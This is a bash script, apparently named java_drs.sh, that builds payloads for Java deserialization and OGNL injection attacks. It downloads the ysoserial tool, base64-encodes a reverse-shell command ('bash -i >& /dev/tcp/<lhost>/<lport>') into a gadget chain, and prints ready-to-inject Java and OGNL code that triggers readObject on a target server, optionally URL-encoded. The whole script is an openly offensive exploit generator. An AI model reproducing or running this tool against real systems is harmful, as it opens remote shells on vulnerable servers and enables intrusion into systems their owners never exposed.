#!/bin/bash

if [ $# -lt 3 ]
then
    echo $'
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""\'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB\'
    `O\'OOOO\'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO\'    `OOOOo
    .OOOO\'            `OOOOOOOOOOOOOOOOOOOOOOOOOO\'            `OO
    OOOOO                 \'"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  \'"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   \'"OOROAOPOEOOOoOY"     "OOO"
    Y           \'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?\'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 \'%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO\':
                      `$"  `OOOO\' `O"Y \' `OOOO\'  o             .
    .                  .     OP"          : o     .
                              :
    '
    echo '==================== JAVA/OGNL DESEREALIZATION REVERSE SHELL ===================='
    echo 'Usage : java_drs.sh <ysoserial payload> <lhost> <lport> [url_enc_stream]'
    exit 1
fi

if ! [ -f "ysoserial.jar" ]
then
    echo 'Dowloading last version of ysoserial...'
    wget -U "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" "https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" -O "ysoserial.jar"
fi

command=$(printf "bash -i >& /dev/tcp/$2/$3 0>&1" | base64)
payload=$(java -jar ysoserial.jar $1 "bash -c {printf,$command}|{base64,-d}|{bash,-i}" | base64 | tr -d '\n')

code_java="String gdavi=\"$payload\";byte[] decoded=java.util.Base64.getDecoder().decode(gdavi);java.io.ObjectInputStream is=new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(decoded));is.readObject();"
code_ognl="(#gdavi='$payload').(#decoded=@java.util.Base64@getDecoder().decode(#gdavi)).(#is=new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(#decoded))).(#is.readObject())"
code_ognl_root="#gdavi='$payload',#decoded=@java.util.Base64@getDecoder().decode(#gdavi),#is=new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(#decoded)),#is.readObject()"

if [ "$4" = 'url_enc_stream' ]
then
    code_java=$(python3 byte_url_enc.py "$code_java")
    code_ognl=$(python3 byte_url_enc.py "$code_ognl")
    code_ognl_root=$(python3 byte_url_enc.py "$code_ognl_root")
fi

echo ""
echo "=================================== JAVA CODE ==================================="
echo $code_java
echo ""
echo "================================== OGNL CODE 1 =================================="
echo $code_ognl
echo ""
echo "================================== OGNL CODE 2 =================================="
echo $code_ognl_root
echo ""

exit 0